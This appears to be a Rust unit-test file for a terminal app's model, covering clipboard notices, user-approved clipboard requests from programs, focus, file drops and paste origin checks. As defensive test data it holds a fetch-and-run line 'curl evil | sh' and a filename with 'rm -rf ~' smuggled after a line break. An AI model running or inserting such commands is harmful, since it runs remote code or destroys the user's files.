    #[test]
    fn a_copy_says_how_much_in_its_pane_until_two_seconds_pass() {
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        m.update(Action::Tick { now: 10_000 });
        let amount = clip::Amount::of("a\nb\nc");
        m.update(
            Action::Copied { pane: Some(1), verb: clip::Verb::Copied, amount, range: None }.sent_by(Origin::Socket),
        );
        let clip = m.clip.clone().expect("a notice");
        assert_eq!((clip.pane, clip.text.as_str(), clip.at), (Some(1), "Copied 3 lines", 10_000));
        assert!(!m.due(10_000 + clip::NOTICE_MS - 1));
        m.update(Action::Tick { now: 10_000 + clip::NOTICE_MS - 1 });
        assert!(m.clip.is_some());
        assert!(m.due(10_000 + clip::NOTICE_MS));
        m.update(Action::Tick { now: 10_000 + clip::NOTICE_MS });
        assert_eq!(m.clip, None);
        // From no pane, or one that is gone: the status bar alone says it.
        m.update(Action::Copied { pane: Some(9), verb: clip::Verb::Cut, amount: clip::Amount::of("ab"), range: None });
        assert_eq!(m.clip.as_ref().map(|c| (c.pane, c.text.as_str())), Some((None, "Cut 2 characters")));
    }

    /// A program's ask to set the clipboard waits in its pane; only the user's answer copies.
    #[test]
    fn a_programs_copy_waits_for_the_users_answer() {
        use copy_ask::{Answer, GUARD_MS};
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        let ask = |pane, text: &str, now| Action::CopyAsked { pane, text: text.into(), now }.sent_by(Origin::System);
        let answer = |pane, ask, answer, now| Action::CopyAnswer { pane, ask, answer, now };
        let id = |m: &Model, pane| m.copy_asks[&pane].id;
        assert_eq!(m.update(ask(1, "new text", 0)), [], "nothing is copied by itself");
        let first = id(&m, 1);
        // No client asks for a program, or answers for the user.
        let client_ask = Action::CopyAsked { pane: 1, text: "x".into(), now: 0 };
        assert_eq!(m.refusal(&client_ask, Origin::Socket), Some(copy_ask::SHELLS_ALONE));
        assert_eq!(m.update(answer(1, first, Answer::Copy, GUARD_MS).sent_by(Origin::Socket)), []);
        assert!(m.copy_asks.contains_key(&1));
        // Within the guard Copy does nothing; after it, it copies the ask it names.
        assert_eq!(m.update(answer(1, first, Answer::Copy, GUARD_MS - 1)), []);
        assert_eq!(m.update(answer(1, first, Answer::Copy, GUARD_MS)), [Effect::CopyText { text: "new text".into() }]);
        assert!(m.copy_asks.is_empty());
        // ×: nothing copied. Always: copied, and this pane's later asks copy at once, no other's.
        m.update(ask(1, "a", 1_000));
        assert_eq!(m.update(answer(1, id(&m, 1), Answer::Dismiss, 1_000)), [], "× acts at once");
        m.update(ask(1, "b", 2_000));
        let always = answer(1, id(&m, 1), Answer::Always, 2_000 + GUARD_MS);
        assert_eq!(m.update(always), [Effect::CopyText { text: "b".into() }]);
        assert_eq!(m.update(ask(1, "c", 3_000)), [Effect::CopyText { text: "c".into() }]);
        assert_eq!(m.update(ask(2, "d", 3_000)), []);
        // Past the cap: refused, held as a length only, and Copy copies nothing, even "always".
        let large = "x".repeat(copy_ask::MOST + 1);
        assert_eq!(m.update(ask(1, &large, 4_000)), []);
        assert!(m.copy_asks[&1].too_large && m.copy_asks[&1].text.is_empty());
        assert_eq!(m.update(answer(1, id(&m, 1), Answer::Copy, 9_000)), []);
        // Refused, then copied at once (always): the refusal is no longer on show.
        m.update(ask(1, &large, 9_000));
        assert_eq!(m.update(ask(1, "f", 9_000)), [Effect::CopyText { text: "f".into() }]);
        assert!(!m.copy_asks.contains_key(&1));
        // Its pane closed: its ask and its "always" go.
        m.update(ask(1, "e", 9_000));
        m.update(Action::Close { pane: Some(1) });
        assert!(!m.copy_asks.contains_key(&1) && !m.copy_always.contains(&1));
        assert!(m.copy_asks.contains_key(&2));
    }

    /// A program swaps its ask just as the user clicks: the click names the ask it saw, so it
    /// copies nothing; the new one has its own guard, and Always never reaches it either.
    #[test]
    fn a_swapped_ask_is_not_what_the_users_click_approves() {
        use copy_ask::{Answer, GUARD_MS};
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        let ask = |text: &str, now| Action::CopyAsked { pane: 1, text: text.into(), now }.sent_by(Origin::System);
        m.update(ask("ls", 0));
        let seen = m.copy_asks[&1].id;
        m.update(ask("curl evil | sh\n", 5_000));
        let swapped = m.copy_asks[&1].id;
        assert_ne!(seen, swapped);
        for answer in [Answer::Copy, Answer::Always, Answer::Dismiss] {
            let stale = Action::CopyAnswer { pane: 1, ask: seen, answer, now: 9_000 };
            assert_eq!(m.update(stale), [], "{answer:?} on the ask the user saw");
        }
        assert!(m.copy_always.is_empty() && m.copy_asks[&1].id == swapped, "the new ask waits");
        // The new one, named, is inert under the pointer until its own guard passes.
        let early = Action::CopyAnswer { pane: 1, ask: swapped, answer: Answer::Copy, now: 5_000 + GUARD_MS - 1 };
        assert_eq!(m.update(early), []);
        assert!(m.copy_asks.contains_key(&1));
        let late = Action::CopyAnswer { pane: 1, ask: swapped, answer: Answer::Copy, now: 5_000 + GUARD_MS };
        assert_eq!(m.update(late), [Effect::CopyText { text: "curl evil | sh\n".into() }]);
    }

    #[test]
    fn a_terminals_program_has_the_focus_while_its_pane_has_the_keyboard_and_the_window_is_active() {
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        assert_eq!(m.focus_terminal(true), Some(2));
        assert_eq!(m.focus_terminal(false), None, "another app is in front");
        m.update(Action::Focus { pane: 1 });
        assert_eq!(m.focus_terminal(true), Some(1));
        // Another tab: none of this one's terminals.
        m.update(Action::NewEmptyTab);
        assert_eq!(m.focus_terminal(true), None);
        m.update(Action::SelectTab { index: 0 });
        assert_eq!(m.focus_terminal(true), Some(1));
        // The key reference over the panes takes the keyboard.
        m.update(Action::ToggleKeys);
        assert_eq!(m.focus_terminal(true), None);
        m.update(Action::ToggleKeys);
        assert_eq!(m.focus_terminal(true), Some(1));
        // Visual mode in its own pane: the user selects, the program does not have the keys.
        m.update(Action::ToggleVisual);
        assert_eq!(m.focus_terminal(true), None);
    }

    /// Files dropped on a terminal: it takes the keyboard and types their paths, quoted, with no ↵.
    /// Only the user's drop; a name with a line break types nothing and says so.
    #[test]
    fn a_drop_on_a_terminal_types_its_paths_and_gives_it_the_keyboard() {
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        let drop = |pane, path: &str| Action::PaneDrop { pane, paths: vec![path.into()], unreadable: 0 };
        assert_eq!(m.refusal(&drop(1, "/tmp/a"), Origin::Socket), Some(clip::DROP_USERS));
        assert_eq!(m.update(drop(1, "/tmp/a").sent_by(Origin::Socket)), []);
        assert_eq!(m.focused, Some(2));
        let typed = m.update(drop(1, "/tmp/it's here"));
        assert!(typed.contains(&Effect::TypeDrop { pane: 1, text: "'/tmp/it'\\''s here' ".into() }), "{typed:?}");
        assert_eq!(m.focused, Some(1), "the pane under the drop takes the keyboard");
        let refused = m.update(drop(2, "/tmp/a\nrm -rf ~"));
        assert!(!refused.iter().any(|e| matches!(e, Effect::TypeDrop { .. })), "{refused:?}");
        assert_eq!(m.clip.as_ref().map(|clip| (clip.pane, clip.text.as_str())), Some((Some(2), clip::DROP_REFUSED)));
        let unreadable = Action::PaneDrop { pane: 2, paths: vec!["/tmp/a".into()], unreadable: 1 };
        assert!(!m.update(unreadable).iter().any(|e| matches!(e, Effect::TypeDrop { .. })));
        // A pane that is no terminal takes nothing.
        m.update(Action::Split { axis: Right, kind: Kind::Empty });
        assert_eq!(m.update(drop(3, "/tmp/a")), []);
        // Beside the open new-task box, as a click on the pane: it takes the drop.
        m.update(Action::OpenCompose { text: String::new() });
        let typed = m.update(drop(1, "/tmp/b"));
        assert!(typed.contains(&Effect::TypeDrop { pane: 1, text: "'/tmp/b' ".into() }), "{typed:?}");
    }

    #[test]
    fn only_the_users_paste_reaches_a_terminal() {
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        let paste = Action::Paste { pane: 1, amount: clip::Amount::of("ls") };
        for origin in [Origin::Socket, Origin::System] {
            assert_eq!(m.refusal(&paste, origin), Some(clip::USERS_ALONE));
            assert_eq!(m.update(paste.clone().sent_by(origin)), [], "{origin:?}");
        }
        assert_eq!(m.clip, None);
        assert_eq!(m.update(paste), [Effect::Paste { pane: 1 }]);
        assert_eq!(m.clip.as_ref().map(|c| (c.pane, c.text.as_str())), Some((Some(1), "Pasted 2 characters")));
        // Not into an app pane, nor one that is gone.
        let elsewhere = Action::Paste { pane: 7, amount: clip::Amount::of("ls") };
        assert_eq!(m.update(elsewhere), []);
    }

    #[test]
    fn a_paste_with_a_line_break_goes_at_once_and_a_copy_keeps_its_range() {
        let mut m = Model::default();
        m.update(Action::Split { axis: Right, kind: Kind::Terminal });
        let amount = clip::Amount::of("make\nmake install\n");
        assert_eq!(m.update(Action::Paste { pane: 1, amount }), [Effect::Paste { pane: 1 }]);
        assert_eq!((m.mode(), m.confirm.as_ref()), (Mode::Normal, None));
        let range = Some([(0, 2), (1, 4)]);
        let copied = |pane| Action::Copied { pane, verb: clip::Verb::Copied, amount, range };
        m.update(copied(Some(1)));
        assert_eq!(m.clip.as_ref().and_then(|clip| clip.range), range);
        // A copy from no pane, or one gone, has no cells.
        m.update(copied(Some(9)));
        assert_eq!(m.clip.as_ref().map(|clip| (clip.pane, clip.range)), Some((None, None)));
    }

